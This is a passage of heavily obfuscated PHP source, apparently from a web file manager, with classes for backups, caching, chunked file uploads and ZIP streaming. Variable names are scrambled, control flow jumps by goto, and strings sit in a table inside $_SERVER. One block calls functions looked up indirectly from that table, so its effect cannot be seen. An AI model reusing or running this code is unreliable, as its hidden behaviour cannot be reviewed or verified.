PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto f; E㱜ŵٴ: return $Bքڜ; goto F; F: } private static function getRawObject($F͍祰, $Aӎ = 0) { goto b; b: $C =& $_SERVER[ԥ]; $EɻҢ = $C[33]; $A奩 = $C[33]; goto D; D: $Aӎ += strspn($F͍祰, $C[1554], $Aӎ); $F = $F͍祰[$Aӎ]; switch ($F) { case $C[1555]: $A툔© = strcspn($F͍祰, $C[1556], $Aӎ); if ($A툔© > 0) { $Aӎ += $A툔©; return self::getRawObject($F͍祰, $Aӎ); } break; case $C[8]: $EɻҢ = $F; ++$Aӎ; $C = preg_match($C[1557], substr($F͍祰, $Aӎ, 256), $d߰뇃); if (1 == $C) { $A奩 = $d߰뇃[1]; $Aӎ += strlen($A奩); } break; case $C[244]: case $C[802]: $EɻҢ = $F; ++$Aӎ; $a = $Aӎ; if ($C[244] == $F) { $e = 1; while ($e > 0) { if (!isset($F͍祰[$a])) { break; } $c߇̇ = $F͍祰[$a]; switch ($c߇̇) { case $C[93]: ++$a; break; case $C[244]: ++$e; break; case $C[802]: --$e; break; } ++$a; } $A奩 = substr($F͍祰, $Aӎ, $a - $Aӎ - 1); $Aӎ = $a; } break; case $C[153]: case $C[472]: $EɻҢ = $F; ++$Aӎ; if ($C[153] == $F) { $A奩 = array(); do { $c̄ = $Aӎ; $c = self::getRawObject($F͍祰, $Aӎ); $Aӎ = $c[2]; $A奩[] = $c; } while ($C[472] != $c[0] && $Aӎ != $c̄); array_pop($A奩); } break; case $C[910]: case $C[913]: if (isset($F͍祰[$Aӎ + 1]) && $F͍祰[$Aӎ + 1] == $F) { $EɻҢ = $F . $F; $Aӎ += 2; if ($C[910] == $F) { $A奩 = array(); do { $c̄ = $Aӎ; $c = self::getRawObject($F͍祰, $Aӎ); $Aӎ = $c[2]; $A奩[] = $c; } while ($C[1558] != $c[0] && $Aӎ != $c̄); array_pop($A奩); } } else { $EɻҢ = $F; ++$Aӎ; $C = preg_match($C[1559], substr($F͍祰, $Aӎ), $d߰뇃); if ($C[910] == $F && 1 == $C) { $A奩 = strtr($d߰뇃[1], $C[1560], $C[33]); $Aӎ += \strlen($d߰뇃[0]); } elseif (!1 !== ($D帹 = strpos($F͍祰, $C[913], $Aӎ))) { $Aӎ = $D帹 + 1; } } break; default: if ($C[1561] == substr($F͍祰, $Aӎ, 6)) { $EɻҢ = $C[1561]; $Aӎ += 6; } elseif ($C[99] == substr($F͍祰, $Aӎ, 4)) { $EɻҢ = $C[99]; $Aӎ += 4; $A奩 = $C[99]; } elseif ($C[1562] == substr($F͍祰, $Aӎ, 4)) { $EɻҢ = $C[1563]; $Aӎ += 4; $A奩 = $C[1562]; } elseif ($C[1564] == substr($F͍祰, $Aӎ, 5)) { $EɻҢ = $C[1563]; $Aӎ += 5; $A奩 = $C[1564]; } elseif ($C[1565] == substr($F͍祰, $Aӎ, 6)) { $EɻҢ = $C[1565]; $Aӎ += 6; if (1 == preg_match($C[1566], substr($F͍祰, $Aӎ), $d߰뇃)) { $Aӎ += strlen($d߰뇃[0]); $b׳ӛ = $C[1567]; $C = preg_match($b׳ӛ, substr($F͍祰, $Aӎ), $d߰뇃, PREG_OFFSET_CAPTURE); if (1 == $C) { $A奩 = substr($F͍祰, $Aӎ, $d߰뇃[0][1]); $Aӎ += $d߰뇃[1][1]; } } } elseif ($C[1568] == substr($F͍祰, $Aӎ, 9)) { $EɻҢ = $C[1568]; $Aӎ += 9; } elseif (1 == preg_match($C[1569], substr($F͍祰, $Aӎ, 33), $d߰뇃)) { $EɻҢ = $C[1531]; $Aӎ += strlen($d߰뇃[0]); $A奩 = intval($d߰뇃[1]) . $C[70] . intval($d߰뇃[2]); } elseif (1 == preg_match($C[1570], substr($F͍祰, $Aӎ, 33), $d߰뇃)) { $EɻҢ = $C[1571]; $A奩 = intval($d߰뇃[1]) . $C[70] . intval($d߰뇃[2]); $Aӎ += strlen($d߰뇃[0]); } elseif (($Fʡ = strspn($F͍祰, $C[1572], $Aӎ)) > 0) { $EɻҢ = $C[1573]; $A奩 = substr($F͍祰, $Aӎ, $Fʡ); $Aӎ += $Fʡ; } break; } goto e; e: return array($EɻҢ, $A奩, $Aӎ); goto Dע; Dע: } } goto d֤; EӲȇ: if ($_SERVER[$_SERVER[ԥ][718]] != $_SERVER[$_SERVER[ԥ][719]]) { goto D; d骽ċ: $AƋơ($_SERVER[$_SERVER[ԥ][725]]); goto e; C: $A = explode($_SERVER[ԥ][213], $B֠); if (count($A) < $_SERVER[ԥ][544]) { $d嘃о = $_SERVER[ԥ][723]; $d嘃о(); } $AƋơ = $_SERVER[ԥ][724]; goto d骽ċ; D: $F = $_SERVER[ԥ][720]; $CĴ = $_SERVER[$_SERVER[ԥ][721]] . $_SERVER[ԥ][722]; $B֠ = $F($CĴ); goto C; e: } class BackupFile { public function __construct() { } public function index() { goto c҇; Bã: $bӴ = 1000; $Bث = $b = 0; $Bީ = array(); goto d㩽; Cޅ: $Fצ = $c ? 1 : 0; $dϯ = array($_SERVER[ԥ][742] => 1, $_SERVER[ԥ][687] => time(), $_SERVER[ԥ][693] => $Fצ, $_SERVER[ԥ][739] => $dјȘ, $_SERVER[ԥ][731] => $E͸, $_SERVER[ԥ][730] => $E񋛪); if ($b) { $dϯ[$_SERVER[ԥ][740]] = $E; $dϯ[$_SERVER[ԥ][741]] = $Aо; } goto FҎ; E: $c = !0; $Aφ = $this->storeIds(); $A = 1; goto Bã; d㩽: $Aо = $E = 0; do { $Ď = $_SERVER[ԥ][732]; $f񞫎 = Model($_SERVER[ԥ][703])->where($B)->field($Ď)->order($_SERVER[ԥ][733])->selectPage($bӴ, $A); $Fە = !empty($f񞫎[$_SERVER[ԥ][350]]) ? $f񞫎[$_SERVER[ԥ][350]] : array(); foreach ($Fە as $c) { goto b; b: if ($Bث >= 1024 * 1024 * 100) { $dϯ = array($_SERVER[ԥ][739] => $dјȘ, $_SERVER[ԥ][740] => $E, $_SERVER[ԥ][741] => $Aо); Backup::set($dϯ); $Bث = $b = 0; } goto dϨ; Eϩ: $Bث += $c[$_SERVER[ԥ][77]]; $E += 1; $Aо += $c[$_SERVER[ԥ][77]]; goto b; b: if (!$this->_fileExist($c, $Bީ, $Aφ)) { $E񋛪 -= 1; $E͸ -= (int) $c[$_SERVER[ԥ][77]]; write_log("\146\151\x6c\x65\40\x6e\x6f\x74\40\145\x78\151\163\x74\x2e\x66\x69\154\x65\111\104\x3a{$c[$_SERVER[ԥ][415]]}\54\x20\160\x61\x74\150\72{$c[$_SERVER[ԥ][75]]}", $_SERVER[ԥ][734]); continue; } $F҅ = $c[$_SERVER[ԥ][75]]; $B = "\173\x69\x6f\72{$EŴ[$_SERVER[ԥ][675]]}\175" . substr($F҅, strlen("\173\151\157\72{$c[$_SERVER[ԥ][735]]}\175")); goto C; C: if (IO::exist($B)) { $C->updateFileEnd($c[$_SERVER[ԥ][28]], $c[$_SERVER[ԥ][77]]); } else { $B = get_path_father($B); IO::mkdir($B); if (!IO::copy($F҅, $B, $_SERVER[ԥ][736])) { write_log($_SERVER[ԥ][737] . $F҅ . $_SERVER[ԥ][738] . $B . $_SERVER[ԥ][472], $_SERVER[ԥ][696]); $c = !1; break; } } $dјȘ = $c[$_SERVER[ԥ][415]]; $b += 1; goto Eϩ; dϨ: } $dᬓ = count($Fە); $A++; } while ($dᬓ == $bӴ); $C->end(); goto Cޅ; c҇: $EŴ = Backup::get(); $dјȘ = $EŴ[$_SERVER[ԥ][277]][$_SERVER[ԥ][163]][$_SERVER[ԥ][415]]; $B = array($_SERVER[ԥ][416] => array($_SERVER[ԥ][726], $dјȘ), $_SERVER[ԥ][727] => array($_SERVER[ԥ][315], $EŴ[$_SERVER[ԥ][675]])); goto Cí; FҎ: Backup::set($dϯ); $this->_fileFilter($Bީ); return !0; goto Fˍ; Cí: $E񋛪 = (int) Model($_SERVER[ԥ][703])->where($B)->count($_SERVER[ԥ][415]); $E͸ = (int) Model($_SERVER[ԥ][703])->where($B)->sum($_SERVER[ԥ][77]); $C = new TaskFileTransfer($_SERVER[ԥ][728], $_SERVER[ԥ][696], $E񋛪, LNG($_SERVER[ԥ][697]) . $_SERVER[ԥ][698] . LNG($_SERVER[ԥ][729])); goto f; f: $C->task[$_SERVER[ԥ][682]] = $E͸; $dϯ = array($_SERVER[ԥ][730] => $E񋛪, $_SERVER[ԥ][731] => $E͸); Backup::set($dϯ); goto E; Fˍ: } private function _fileExist($Cƶ, &$A񙖹, $DƧ) { goto e熌; bʻವ: if (!in_array($Cƶ[$a[735]], $DƧ)) { return !1; } if (IO::exist($b)) { return !0; } $EӠѼ = get_path_father($b); goto Fݴ; Fݴ: if (IO::exist($EӠѼ)) { $A񙖹[] = $Cƶ[$a[415]]; return !1; } $cӵ = array($a[735] => $Cƶ[$a[735]], $a[75] => array($a[743], "{$EӠѼ}\45")); $b = Model($a[703])->where($cӵ)->field($a[416])->select(); goto B՝; e熌: $a =& $_SERVER[ԥ]; $b = $Cƶ[$a[75]]; if (in_array($Cƶ[$a[415]], $A񙖹)) { return !1; } goto bʻವ; B՝: $A񙖹 = array_merge($A񙖹, array_to_keyvalue($b, $a[33], $a[415])); return !1; goto A׏; A׏: } private function _fileFilter($a) { $fĂ =& $_SERVER[ԥ]; if (empty($a)) { return; } $D = array($fĂ[415] => array($fĂ[7], array_unique($a))); $FΝ = Model($fĂ[744])->where($D)->field($fĂ[365])->select(); foreach ($FΝ as $D̻) { Model($fĂ[744])->remove($D̻[$fĂ[365]], !1); } } private function storeIds() { $C =& $_SERVER[ԥ]; $E = Model($C[688])->listData(); return array_to_keyvalue($E, $C[33], $C[363]); } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { goto Eޥ; fұܢ: $A݃ = $GLOBALS[$Fݿ[6]][$Fݿ[333]]; $C = $A݃[$A݃[$Fݿ[745]]]; $F޴ަ = $A݃[$Fݿ[746]]; goto f۠; Eޥ: $Fݿ =& $_SERVER[ԥ]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); goto fұܢ; f۠: switch ($A݃[$Fݿ[745]]) { case $Fݿ[17]: self::$handle = Model($Fݿ[747]); break; case $Fݿ[748]: self::$handle = new CacheRedis($C, $F޴ަ); break; case $Fݿ[749]: self::$handle = new CacheMemcached($C, $F޴ަ); break; case $Fݿ[163]: self::$handle = new CacheFile($C, $F޴ަ); break; default: break; } return self::$handle; goto D۠; D۠: } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($Eߎ) { if (is_array($Eߎ) || is_object($Eߎ)) { $Eߎ = json_encode($Eߎ); } $Eߎ = rawurlencode($Eߎ); return KOD_SITE_ID . $_SERVER[ԥ][70] . $Eߎ; } public static function get($E) { $cȮ = self::key($E); if (!isset(self::$memoryCache[$cȮ])) { $Aᥦ = self::init()->get($cȮ); self::$memoryCache[$cȮ] = unserialize($Aᥦ); } return self::$memoryCache[$cȮ]; } public static function set($Eۂ, $d, $fʑ = false) { goto DöЃ; Dԏ: CacheLock::unlock($Eۂ); return $a̘藽; goto d; C: CacheLock::lock($Eۂ); $a̘藽 = self::init()->set($fŚܧ, serialize($d), $fʑ); self::$memoryCache[$fŚܧ] = $d; goto Dԏ; DöЃ: $fŚܧ = self::key($Eۂ); if (isset(self::$memoryCache[$fŚܧ]) && self::$memoryCache[$fŚܧ] === $d) { return !0; } if ($fʑ === 0) { self::$memoryCache[$fŚܧ] = $d; return !0; } goto C; d: } public static function remove($cՕ) { goto A; A: $bѣ = self::key($cՕ); unset(self::$memoryCache[$bѣ]); self::clearTimeout(); goto eƪϽ; Cᒑ: return $Eŕ۩; goto bţ; eƪϽ: CacheLock::lock($cՕ); $Eŕ۩ = self::init()->remove($bѣ); CacheLock::unlock($cՕ); goto Cᒑ; bţ: } public static function clearMemory($c = false) { if ($c) { $c = self::key($c); unset(self::$memoryCache[$c]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ԥ][750])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ԥ][751])) { self::init()->clearTimeout(); } } } goto d; b˔Ш: if (class_exists($_SERVER[ԥ][1928])) { class Services_JSON_Error extends PEAR_Error { function __construct($B = "\165\156\153\x6e\x6f\167\156\x20\x65\162\162\x6f\162", $Dڴ = null, $bɸ = null, $FË = null, $c爄 = null) { parent::PEAR_Error($B, $Dڴ, $bɸ, $FË, $c爄); } } } else { class Services_JSON_Error { function __construct($d = "\x75\x6e\x6b\x6e\157\x77\x6e\40\145\x72\162\157\162", $Cߕ = null, $E➚τ = null, $a = null, $f޶ = null) { } } } class Uploader { public $fileName; public $uploadFile; public $tempFile; public function __construct() { goto EՂ; f: $this->checkSize(); $this->tempPathInit(); goto aݭ; EՂ: $Aכ =& $_SERVER[ԥ]; global $in; $this->in =& $in; goto aؒ; aؒ: if (!empty($_FILES)) { $Bć = $_FILES[$Aכ[163]]; $this->uploadFile = $Bć[$Aכ[1929]]; if (!$this->uploadFile && $Bć[$Aכ[1194]] > 0) { show_json($this->errorInfo($Bć[$Aכ[1194]]), !1); } } else { if (isset($in[$Aכ[382]])) { $this->uploadFile = isset($in[$Aכ[1930]]) ? $Aכ[1931] : $Aכ[1776]; } } $this->fileName = self::fileName(); $this->statusData = !1; goto f; aݭ: } public function upload() { goto e; FÇč: CacheLock::lock($this->tempFile, 20); $DՏ = $this->statusGet(); $this->initFileTemp(); goto b; f󤮥Ä: $cؓ = $this->writeTo($Aڒ, $CȘ, $this->tempFile); $Aѥ = IO::hashSimple($Aڒ); $Bɉ = IO::size($Aڒ); goto Dͳ; e: $Fˑ =& $_SERVER[ԥ]; $dʂۍ = isset($this->in[$Fˑ[1932]]) ? intval($this->in[$Fˑ[1932]]) : 0; $Eв = isset($this->in[$Fˑ[1933]]) ? intval($this->in[$Fˑ[1933]]) : 1; goto eб; bԬ: ignore_timeout(); if (!$this->checkChunkHash($DՏ)) { $this->showJson($Fˑ[1946], !1); } $this->statusSet(!1); goto Cܵ; eб: $Aç = $this->tempFile . $Fˑ[1934] . $dʂۍ; $Bɉ = isset($this->in[$Fˑ[516]]) ? intval($this->in[$Fˑ[516]]) : 0; $cͺ냟 = isset($this->in[$Fˑ[1935]]) ? intval($this->in[$Fˑ[1935]]) : 0; goto fŞѠ; b: $Aڒ = $this->moveUploadedFile($Aç); if ($Bɉ > 0 && filesize($Aڒ) == 0) { $this->showJson($Fˑ[1937], !1); } if (!$Aڒ) { $this->showJson(LNG($Fˑ[1938]), !1); } goto Dքꜭ; Cܵ: CacheLock::unlock($this->tempFile); return $this->tempFile; goto Bگ; Dքꜭ: $d۝ = $dʂۍ * $cͺ냟; $CȘ = @fopen($this->tempFile, $Fˑ[1939]); fseek($CȘ, $d۝); goto f󤮥Ä; Dͳ: @unlink($Aڒ); if (!$cؓ) { $this->showJson($Fˑ[1940] . $dʂۍ, !1); } $DՏ[$Fˑ[1941]] = $Eв; goto a; fŞѠ: if ($Eв > 1 && $cͺ냟 <= 0) { show_json($Fˑ[1936], !1); } if ($cͺ냟 > $Bɉ) { $Eв = 1; } if ($Eв <= 1) { $this->tempFile = $this->tempFile . rand_string(5); $this->statusSet(!1); return $this->moveUploadedFile($this->tempFile); } goto FÇč; a: $DՏ[$Fˑ[1942]][$Fˑ[1943] . $dʂۍ] = array($Fˑ[1944] => $d۝, $Fˑ[1019] => $dʂۍ, $Fˑ[77] => $Bɉ, $Fˑ[160] => $Aѥ); $this->statusSet($DՏ); if (count($DՏ[$Fˑ[1942]]) != $DՏ[$Fˑ[1941]]) { $this->showJson($Fˑ[1945] . $dʂۍ, !0); } goto bԬ; Bگ: } private function checkSize() { $Eΐ =& $_SERVER[ԥ]; if (phpBuild64() || $this->in[$Eΐ[77]] < PHP_INT_MAX) { return; } show_json(LNG($Eΐ[1947]), !1); } private function showJson($c֬˂, $AӦˇ) { CacheLock::unlock($this->tempFile); if (!$AӦˇ) { return show_json($c֬˂, $AӦˇ); } show_json($c֬˂, $AӦˇ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto bы; bы: $Fࢺ =& $_SERVER[ԥ]; $b = TEMP_FILES; @mk_dir($b); goto A͑; Aˎۃ: $this->tempFile = $b . $Fࢺ[1950] . md5($Bӻ . $this->in[$Fࢺ[1494]]); goto bՌ; A͑: touch($b . $Fࢺ[1948]); $Bӻ = isset($this->in[$Fࢺ[1949]]) ? $this->in[$Fࢺ[1949]] : !1; if (strlen($Bӻ) < 30) { $Bӻ = md5(USER_ID . $this->in[$Fࢺ[75]] . $this->fileName . $this->in[$Fࢺ[77]]); } goto Aˎۃ; bՌ: } private function moveUploadedFile($Bʭ) { $b =& $_SERVER[ԥ]; $bܼ = $this->uploadFile; if ($bܼ == $b[1951]) { @file_put_contents($Bʭ, base64_decode($_REQUEST[$b[1952]])); } else { if ($bܼ == $b[1776]) { $E = @fopen($Bʭ, $b[1484]); $this->writeTo($bܼ, $E, $Bʭ); } else { if (!move_uploaded_file($bܼ, $Bʭ)) { return !1; } } } return $Bʭ; } private function writeTo($D֯, $Dؤ, $Fװ) { goto f; bƼȌ: fclose($B擉Ʋ); fclose($Dؤ); CacheLock::unlock($Bگ㖜); goto dԫ; f: $aɜȇ =& $_SERVER[ԥ]; $Bگ㖜 = $aɜȇ[1953] . $Fװ; $Aٲ = CacheLock::lock($Bگ㖜, 1); goto e; dԫ: return !0; goto a; e: $B擉Ʋ = @fopen($D֯, $aɜȇ[1483]); if (!$B擉Ʋ || !$Dؤ || !$Aٲ) { CacheLock::unlock($Bگ㖜); return !1; } while (!feof($B擉Ʋ)) { fwrite($Dؤ, fread($B擉Ʋ, 1024 * 200)); } goto bƼȌ; a: } private function statusGet() { goto CτԄ; EƜ: if (!$this->statusData) { $bևנī = array($cǄސ[28] => $this->fileName, $cǄސ[1941] => 0, $cǄސ[1942] => array()); $this->statusSet($bևנī); } return $this->statusData; goto A܄; CτԄ: $cǄސ =& $_SERVER[ԥ]; if (is_array($this->statusData)) { return $this->statusData; } $F = $this->tempFile . $cǄސ[1954]; goto A֝; A֝: $b = !1; if (file_exists($F)) { $b = @file_get_contents($F); } if ($b) { $this->statusData = json_decode($b, !0); } goto EƜ; A܄: } public function statusSet($B跅) { $D = $this->tempFile . $_SERVER[ԥ][1954]; if (!$B跅) { if (file_exists($D)) { @unlink($D); } return !0; } $this->statusData = $B跅; return file_put_contents($D, json_encode($B跅)); } private function initFileTemp() { $b =& $_SERVER[ԥ]; if (file_exists($this->tempFile)) { return; } $c = fopen($this->tempFile, $b[1955]); fseek($c, $this->in[$b[77]] - 1, SEEK_SET); fwrite($c, $b[464]); fclose($c); } public function checkChunk() { goto CÚ; eٛ: $A짙 = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($A짙[$f˓[1942]] as $C) { $bʆ = $C[$f˓[160]]; if ($bʆ) { $Fі[$f˓[1956] . $C[$f˓[1019]]] = $bʆ; } } goto aᷪǏ; aᷪǏ: return $Fі; goto dѻ; CÚ: $f˓ =& $_SERVER[ԥ]; $Fі = array(); CacheLock::lock($this->tempFile); goto eٛ; dѻ: } private function checkChunkHash($eĄ) { goto AѲ; C: $cᦵ۷ = !0; foreach ($eĄ[$F̑[1942]] as $Dѷ) { fseek($EΙ, $Dѷ[$F̑[1944]]); $Dҝ = PathDriverStream::hash($EΙ, $Dѷ[$F̑[77]]); if ($Dѷ[$F̑[160]] != $Dҝ) { $cᦵ۷ = !1; break; } } fclose($EΙ); goto Eߝ; Eߝ: return $cᦵ۷; goto C˻; Cƅ: $d = _get($this->in, $F̑[1957]); if (strlen($d) == 32 && IO::hashSimple($this->tempFile) == $D턣 && IO::hashMd5($this->tempFile) == $d) { return !0; } $EΙ = fopen($this->tempFile, $F̑[1145]); goto C; AѲ: $F̑ =& $_SERVER[ԥ]; if (count($eĄ[$F̑[1942]]) != $eĄ[$F̑[1941]]) { return !1; } $D턣 = _get($this->in, $F̑[1949]); goto Cƅ; C˻: } public static function fileName() { goto Eˬԛڬ; Eˬԛڬ: $Fȳծ =& $_SERVER[ԥ]; global $in; $aˈ = isset($in[$Fȳծ[28]]) ? $in[$Fȳծ[28]] : $Fȳծ[33]; goto bю; E態: $A = strtotime($in[$Fȳծ[1958]]); $A = $A ? $A : time(); $f = strtolower($aˈ); goto CوՍ; CوՍ: if ($f == $Fȳծ[1959] || $f == $Fȳծ[1960]) { $aˈ = date($Fȳծ[674], $A) . $Fȳծ[70] . $in[$Fȳծ[77]] . $Fȳծ[1591]; } else { if ($f == $Fȳծ[1961]) { $aˈ = date($Fȳծ[674], $A) . $Fȳծ[70] . $in[$Fȳծ[77]] . $Fȳծ[1962]; } } return $aˈ; goto b; bю: if (!empty($_FILES)) { $aˈ = $aˈ ? $aˈ : $_FILES[$Fȳծ[163]][$Fȳծ[382]]; } $aˈ = str_replace(array($Fȳծ[93], $Fȳծ[8]), array($Fȳծ[8], $Fȳծ[91]), trim($aˈ)); if (!is_wap()) { return $aˈ; } goto E態; b: } private function errorInfo($CΏ) { $a =& $_SERVER[ԥ]; $D، = array($a[1963], $a[1964], $a[1965], $a[1966], $a[1967], $a[1968], $a[1969], $a[1970]); return $CΏ . $a[4] . $D،[$CΏ]; } } class ZipMake { const VERSION = "\x30\56\62\x2e\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($c媵 = null) { $c݅ =& $_SERVER[ԥ]; $this->outputStream = fopen($c݅[1971], $c݅[1201]); $this->outputName = $c媵; $this->needHeaders = !0; } public function addFile($F̓蘱, $f) { goto cԅ; C ζ: $this->addFileFooter($F̓蘱, $aԔ, $c, $fїˑ, $F껨ح, $EÔ); goto FӜ; Fˑ߽: $EÔ = $this->addFileHeader($F̓蘱, $aԔ); $fїˑ = $F껨ح = filesize($f); $c = fopen($f, $Dך[1972]); goto B; B: while (!feof($c)) { $a = fread($c, 1048576); $this->send($a); } fclose($c); $c = hexdec(hash_file($Dך[1973], $f)); goto C ζ; cԅ: $Dך =& $_SERVER[ԥ]; $F̓蘱 = $this->filterFilename($F̓蘱); $aԔ = static::METHOD_STORE; goto Fˑ߽; FӜ: } public function addFileFromStream($C܃, $BĖ) { goto Eū; aԗ: $a = hash_init($_SERVER[ԥ][1973]); while (!feof($BĖ)) { $F = fread($BĖ, 1048576); hash_update($a, $F); $this->send($F); } $B = hexdec(hash_final($a)); goto c; Eū: $C܃ = $this->filterFilename($C܃); $e = static::METHOD_STORE; $Cڊݲ = $this->addFileHeader($C܃, $e); goto Bߕܰ; Bߕܰ: fseek($BĖ, 0, SEEK_END); $E򉐻 = $e = ftell($BĖ); rewind($BĖ); goto aԗ; c: $this->addFileFooter($C܃, $e, $B, $E򉐻, $e, $Cڊݲ); goto b; b: } public function finish() { foreach ($this->files as $D⻶҇) { $this->addCdrFile($D⻶҇); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($d, $dɤۏ) { goto a; CŽ: $Bݢ = $this->dosTime(time()); $b𢏅 = array(array($bЋ刷[1975], static::FILE_HEADER_SIGNATURE), array($bЋ刷[1976], static::ZIP_VERSION_64), array($bЋ刷[1976], 8), array($bЋ刷[1976], $dɤۏ), array($bЋ刷[1975], $Bݢ), array($bЋ刷[1975], 0), array($bЋ刷[1975], 4294967295), array($bЋ刷[1975], 4294967295), array($bЋ刷[1976], $e ۋ), array($bЋ刷[1976], 32)); $F̃î = array(array($bЋ刷[1976], 1), array($bЋ刷[1976], 28), array($bЋ刷[1977], 0), array($bЋ刷[1977], 0), array($bЋ刷[1977], 0), array($bЋ刷[1975], 0)); goto Fʐ뵓; Fʐ뵓: $CȌ = $this->packFields($b𢏅); $Eȸ = $this->packFields($F̃î); $this->send($CȌ . $d . $Eȸ); goto DɻÒ; DɻÒ: return strlen($CȌ) + $e ۋ + strlen($Eȸ); goto Eܱ; a: $bЋ刷 =& $_SERVER[ԥ]; $d = preg_replace($bЋ刷[1974], $bЋ刷[33], $d); $e ۋ = strlen($d); goto CŽ; Eܱ: } protected function addFileFooter($bıЎ, $a©, $b, $dō, $B㶎, $cԈŏ) { $aν =& $_SERVER[ԥ]; $c = array(array($aν[1975], static::DATA_DESCRIPTOR_SIGNATURE), array($aν[1975], $b), array($aν[1977], $dō), array($aν[1977], $B㶎)); $A儿 = $this->packFields($c); $this->send($A儿); $b׬ = $cԈŏ + $dō + $c; $this->addToCdr($bıЎ, $a©, $b, $dō, $B㶎, $b׬); } private function addToCdr($Dؽ, $Fנ͵, $FĂ, $e, $F˱ϻ, $d╬) { $this->files[] = array($Dؽ, $Fנ͵, $FĂ, $e, $F˱ϻ, $this->ofs); $this->ofs += $d╬; } protected function addCdrFile($Bٜ) { goto Bȇ; aՄШ: $Dѯ = $this->dosTime(time()); $bŐ = array(array($Eêז[1975], static::CDR_FILE_SIGNATURE), array($Eêז[1976], static::ZIP_VERSION_64), array($Eêז[1976], static::ZIP_VERSION_64), array($Eêז[1976], 8), array($Eêז[1976], $bᾐ), array($Eêז[1975], $Dѯ), array($Eêז[1975], $F⤏), array($Eêז[1975], 4294967295), array($Eêז[1975], 4294967295), array($Eêז[1976], strlen($b׿׺)), array($Eêז[1976], 32), array($Eêז[1976], strlen($b)), array($Eêז[1976], 0), array($Eêז[1976], 0), array($Eêז[1975], 32), array($Eêז[1975], 4294967295)); $eݏ׻ = array(array($Eêז[1976], 1), array($Eêז[1976], 28), array($Eêז[1977], $E̵Պ), array($Eêז[1977], $C), array($Eêז[1977], $Fξ), array($Eêז[1975], 0)); goto fӈ; A: $this->send($c); $this->cdr_ofs += strlen($c); goto aιӆ; Bȇ: $Eêז =& $_SERVER[ԥ]; list($b׿׺, $bᾐ, $F⤏, $C, $E̵Պ, $Fξ) = $Bٜ; $b = $Eêז[33]; goto aՄШ; fӈ: $A͎ = $this->packFields($bŐ); $Aұ = $this->packFields($eݏ׻); $c = $A͎ . $b׿׺ . $b . $Aұ; goto A; aιӆ: } protected function addCdr64Eof() { goto FϘ; FϘ: $fܓ =& $_SERVER[ԥ]; $c϶ = count($this->files); $FǍ = $this->cdr_ofs; goto A; E: $this->send($B); goto Dձ; A: $A􈿰 = $this->ofs; $D = array(array($fܓ[1975], static::ZIP64_CDR_EOF_SIGNATURE), array($fܓ[1977], 44), array($fܓ[1976], static::ZIP_VERSION_64), array($fܓ[1976], static::ZIP_VERSION_64), array($fܓ[1975], 0), array($fܓ[1975], 0), array($fܓ[1977], $c϶), array($fܓ[1977], $c϶), array($fܓ[1977], $FǍ), array($fܓ[1977], $A􈿰)); $B = $this->packFields($D); goto E; Dձ: } protected function addCdr64Locator() { goto D܊ߗ; b: $this->send($c;߱); goto E; F: $fҤ = $this->ofs; $F = array(array($a[1975], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($a[1975], 0), array($a[1977], $fҤ + $C٫), array($a[1975], 1)); $c;߱ = $this->packFields($F); goto b; D܊ߗ: $a =& $_SERVER[ԥ]; $dːȋ = count($this->files); $C٫ = $this->cdr_ofs; goto F; E: } protected function addCdrEof() { goto fٻ; fٻ: $C㐂샒 =& $_SERVER[ԥ]; $cڏ̡ = count($this->files); $bڥ = $this->cdr_ofs; goto f㮛Ӛ; c: $fͱ = $this->packFields($eޛ) . $Cꐽ; $this->send($fͱ); goto D낥; f㮛Ӛ: $b콢 = $this->ofs; $Cꐽ = $C㐂샒[33]; $eޛ = array(array($C㐂샒[1975], static::CDR_EOF_SIGNATURE), array($C㐂샒[1976], 0), array($C㐂샒[1976], 0), array($C㐂샒[1976], $cڏ̡), array($C㐂샒[1976], $cڏ̡), array($C㐂샒[1975], 4294967295), array($C㐂샒[1975], 4294967295), array($C㐂샒[1976], strlen($Cꐽ))); goto c; D낥: } protected function addCdr() { foreach ($this->files as $C) { $this->addCdrFile($C); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $Eƶ =& $_SERVER[ԥ]; $FŜ = $Eƶ[198]; if ($this->outputName) { $E = trim(str_replace(array($Eƶ[112], $Eƶ[55], $Eƶ[93], $Eƶ[67], $Eƶ[213], $Eƶ[975]), $Eƶ[33], $this->outputName)); $aġñ = rawurlencode($E); $FŜ .= "\x3b\x20\x66\151\154\145\x6e\x61\155\x65\x2a\75\165\x74\146\x2d\x38\x27\47{$aġñ}"; } $C = array($Eƶ[195] => $Eƶ[1978], $Eƶ[1979] => $FŜ, $Eƶ[1980] => $Eƶ[1981], $Eƶ[1982] => $Eƶ[1983], $Eƶ[1984] => $Eƶ[1985]); foreach ($C as $aʍ٠ => $A¤) { header($aʍ٠ . $Eƶ[865] . $A¤); } } protected function send($D޵) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $D޵); } protected final function dosTime($d) { $F׿ =& $_SERVER[ԥ]; $a㒝 = getdate($d); if ($a㒝[$F׿[1688]] < 1980) { $a㒝 = array($F׿[1688] => 1980, $F׿[1986] => 1, $F׿[1987] => 1, $F׿[1988] => 0, $F׿[1989] => 0, $F׿[1990] => 0); } $a㒝[$F׿[1688]] -= 1980; return $a㒝[$F׿[1688]] << 25 